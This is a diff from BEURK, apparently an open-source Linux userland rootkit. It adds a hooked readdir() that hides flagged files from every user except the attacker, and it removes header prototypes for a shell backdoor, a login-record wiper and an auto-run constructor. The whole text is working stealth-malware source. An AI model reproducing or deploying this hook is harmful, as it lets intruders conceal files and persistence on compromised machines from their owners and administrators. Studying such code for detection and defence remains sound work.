@@ -18,22 +18,23 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
+#include <dirent.h> /* struct dirent, DIR */
+#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_READDIR() */
+#include "hooks.h" /* prototype */
 
-#include <sys/socket.h>
-#include "debug.h"
+struct dirent   *readdir(DIR *dirp) {
+    DEBUG(D_INFO, "call readdir(3) hooked");
 
-/* init.c */
-void        init(void) __attribute__((constructor));
+    struct dirent   *dir;
 
-/* is_attacker.c */
-int         is_attacker(void);
+    dir = REAL_READDIR(dirp);
 
-/* is_hidden_file.c */
-int         is_hidden_file(const char *path);
+    if (is_attacker())
+        return (dir);
 
-/* cleanup_login_records.c */
-void        cleanup_login_records(const char *pty_name);
-
-/* drop_shell_backdoor.c */
-int         drop_shell_backdoor(int sock, struct sockaddr *addr);
+    while (dir && is_hidden_file(dir->d_name)) {
+        dir = REAL_READDIR(dirp);
+    }
+    return (dir);
+}
